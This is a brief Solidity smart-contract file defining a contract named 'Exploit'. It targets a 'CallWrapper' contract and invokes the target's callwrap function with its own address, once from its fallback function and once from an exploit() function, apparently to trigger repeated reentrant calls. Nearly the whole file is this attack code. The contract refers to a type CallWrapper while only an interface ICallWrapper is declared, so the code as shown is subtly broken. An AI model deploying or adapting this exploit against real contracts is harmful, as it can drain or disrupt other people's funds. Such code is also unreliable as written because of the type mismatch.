contract Exploit {
    CallWrapper target;

    constructor(address _target) {
        target = CallWrapper(_target);
    }

    fallback() external payable {
        target.callwrap(address(this));
    }

    function exploit() public payable {
        target.callwrap(address(this));
    }
}

interface ICallWrapper {
    function callwrap(address called) external;
}